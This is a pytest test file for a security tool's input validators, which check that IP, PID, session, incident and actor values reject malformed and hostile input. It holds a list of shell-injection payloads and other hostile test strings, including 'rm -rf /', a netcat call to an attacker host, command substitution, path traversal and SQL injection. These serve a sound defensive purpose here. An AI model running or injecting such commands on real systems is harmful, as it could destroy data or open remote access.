"""Phase 7: validation of containment targets.

The theme: hostile input is *parsed*, not filtered.  A target that is not a
well-formed address or PID does not get escaped and passed along -- it fails to
parse and the request stops.
"""

import ipaddress

import pytest

from sentinelforge.response.validators import (
    MAX_TTL,
    MIN_TTL,
    ValidationError,
    classify_ip,
    default_gateways,
    validate_action_id,
    validate_action_type,
    validate_actor,
    validate_incident_id,
    validate_ip,
    validate_pid,
    validate_reason,
    validate_session_id,
    validate_ttl,
)

#: Payloads that would matter if any of this were ever handed to a shell.
INJECTION_PAYLOADS = [
    "203.0.113.50; rm -rf /",
    "203.0.113.50 && reboot",
    "203.0.113.50 | nc attacker 4444",
    "$(id)",
    "`whoami`",
    "203.0.113.50\nrule family=ipv4 source address=0.0.0.0 accept",
    "203.0.113.50\x00",
    "; firewall-cmd --panic-on",
    "--panic-on",
    "-9",
    "../../etc/passwd",
    "203.0.113.50 --permanent --add-rich-rule=accept",
]


class TestIpValidation:
    @pytest.mark.parametrize("value", ["203.0.113.50", "8.8.8.8", "198.51.100.25"])
    def test_valid_ipv4_is_accepted(self, value):
        assert str(validate_ip(value)) == value

    @pytest.mark.parametrize("value", ["2001:db8::1", "::1", "fe80::1"])
    def test_valid_ipv6_is_accepted(self, value):
        assert validate_ip(value).version == 6

    def test_an_address_object_passes_through(self):
        address = ipaddress.ip_address("203.0.113.50")
        assert validate_ip(address) is address

    def test_surrounding_whitespace_is_tolerated(self):
        assert str(validate_ip("  203.0.113.50 ")) == "203.0.113.50"

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_injection_payloads_are_rejected(self, payload):
        with pytest.raises(ValidationError):
            validate_ip(payload)

    @pytest.mark.parametrize(
        "value", ["", "   ", "not-an-ip", "999.999.999.999", "203.0.113", "evil.example.com"]
    )
    def test_malformed_addresses_are_rejected(self, value):
        with pytest.raises(ValidationError):
            validate_ip(value)

    def test_a_cidr_range_is_rejected_with_a_specific_message(self):
        with pytest.raises(ValidationError, match="single address"):
            validate_ip("10.0.0.0/8")

    def test_a_scoped_ipv6_address_is_rejected(self):
        with pytest.raises(ValidationError, match="scoped"):
            validate_ip("fe80::1%eth0")

    def test_a_hostname_is_never_resolved(self):
        """Resolving a name from telemetry would let an attacker pick the target."""
        with pytest.raises(ValidationError):
            validate_ip("localhost")

    @pytest.mark.parametrize("value", [None, 42, 3.5, [], {}, True])
    def test_non_strings_are_rejected(self, value):
        with pytest.raises(ValidationError):
            validate_ip(value)

    def test_an_overlong_string_is_rejected_before_parsing(self):
        with pytest.raises(ValidationError, match="too long"):
            validate_ip("1" * 200)


class TestIpClassification:
    @pytest.mark.parametrize(
        "value,flag",
        [
            ("127.0.0.1", "is_loopback"),
            ("::1", "is_loopback"),
            ("0.0.0.0", "is_unspecified"),
            ("::", "is_unspecified"),
            ("224.0.0.1", "is_multicast"),
            ("ff02::1", "is_multicast"),
            ("255.255.255.255", "is_broadcast"),
            ("169.254.1.1", "is_link_local"),
            ("240.0.0.1", "is_reserved"),
        ],
    )
    def test_special_addresses_are_recognised(self, value, flag):
        assert classify_ip(value)[flag] is True

    def test_an_ordinary_address_trips_no_special_flag(self):
        facts = classify_ip("8.8.8.8")
        for flag in ("is_loopback", "is_multicast", "is_unspecified", "is_broadcast",
                     "is_reserved", "is_link_local", "is_local_host_address"):
            assert facts[flag] is False

    def test_loopback_is_reported_as_belonging_to_this_host(self):
        assert classify_ip("127.0.0.1")["is_local_host_address"] is True

    def test_the_default_gateway_is_read_from_proc(self, tmp_path):
        route = tmp_path / "route"
        route.write_text(
            "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\n"
            "wlan0\t00000000\t0101A8C0\t0003\t0\t0\t600\t00000000\n"
            "wlan0\t0001A8C0\t00000000\t0001\t0\t0\t600\t00FFFFFF\n"
        )
        assert default_gateways(str(route)) == frozenset({"192.168.1.1"})

    def test_a_missing_route_table_is_not_an_error(self, tmp_path):
        assert default_gateways(str(tmp_path / "nope")) == frozenset()

    def test_a_malformed_route_table_is_ignored(self, tmp_path):
        route = tmp_path / "route"
        route.write_text("header\nnonsense\nwlan0\t00000000\tZZZZ\n")
        assert default_gateways(str(route)) == frozenset()


class TestPidValidation:
    @pytest.mark.parametrize("value,expected", [(42, 42), ("42", 42), (" 42 ", 42)])
    def test_valid_pids_are_accepted(self, value, expected):
        assert validate_pid(value) == expected

    @pytest.mark.parametrize("value", [0, -1, "-1", "0"])
    def test_zero_and_negative_pids_are_rejected(self, value):
        """A negative PID means a whole process group to kill(2)."""
        with pytest.raises(ValidationError):
            validate_pid(value)

    @pytest.mark.parametrize(
        "value", ["4242; rm -rf /", "4242 &&", "abc", "", "4.2", None, [], True, 3.5]
    )
    def test_malformed_pids_are_rejected(self, value):
        with pytest.raises(ValidationError):
            validate_pid(value)

    def test_an_out_of_range_pid_is_rejected(self):
        with pytest.raises(ValidationError, match="out of range"):
            validate_pid(10**12)


class TestSessionValidation:
    @pytest.mark.parametrize("value", ["2", "c1", "session-7"])
    def test_valid_session_ids_are_accepted(self, value):
        assert validate_session_id(value) == value

    @pytest.mark.parametrize("value", ["", "2; reboot", "../2", "a" * 40, None, 7])
    def test_malformed_session_ids_are_rejected(self, value):
        with pytest.raises(ValidationError):
            validate_session_id(value)


class TestRequestMetadata:
    def test_known_action_types_pass(self):
        assert validate_action_type("block_ip") == "block_ip"

    @pytest.mark.parametrize("value", ["rm_rf", "", None, "BLOCK_IP", 7])
    def test_unknown_action_types_are_rejected(self, value):
        with pytest.raises(ValidationError):
            validate_action_type(value)

    def test_incident_ids_must_match_the_phase_3_format(self):
        assert validate_incident_id("INC-000001") == "INC-000001"
        assert validate_incident_id(None) is None
        for bad in ("INC-1; DROP TABLE incidents", "../INC-000001", "incident", 7):
            with pytest.raises(ValidationError):
                validate_incident_id(bad)

    def test_an_incident_id_can_be_required(self):
        with pytest.raises(ValidationError):
            validate_incident_id(None, allow_none=False)

    def test_action_ids_must_match_the_generated_format(self):
        assert validate_action_id("ACTION-00001") == "ACTION-00001"
        for bad in ("ACTION-x", "../ACTION-00001", "", None):
            with pytest.raises(ValidationError):
                validate_action_id(bad)

    def test_reasons_are_bounded_and_stripped_of_control_characters(self):
        assert validate_reason("brute force\x07\x00 from 198.51.100.25") == (
            "brute force from 198.51.100.25"
        )
        assert len(validate_reason("x" * 5000)) == 500

    def test_a_reason_can_be_required(self):
        with pytest.raises(ValidationError):
            validate_reason("", required=True)
        with pytest.raises(ValidationError):
            validate_reason("\x00\x00", required=True)

    def test_actor_labels_are_names_not_free_text(self):
        assert validate_actor("capslock") == "capslock"
        assert validate_actor("soc.analyst@example") == "soc.analyst@example"
        for bad in ("analyst; rm -rf /", "$(id)", "a" * 100, "<script>"):
            with pytest.raises(ValidationError):
                validate_actor(bad)

    def test_an_empty_actor_falls_back_to_the_local_user(self):
        assert validate_actor(None)

    def test_ttl_bounds_are_enforced(self):
        assert validate_ttl(900) == 900
        assert validate_ttl("900") == 900
        assert validate_ttl(None) is None
        for bad in (MIN_TTL - 1, MAX_TTL + 1, "abc", "-5", True, 1.5):
            with pytest.raises(ValidationError):
                validate_ttl(bad)

    def test_a_ttl_can_be_required(self):
        with pytest.raises(ValidationError):
            validate_ttl(None, allow_none=False)
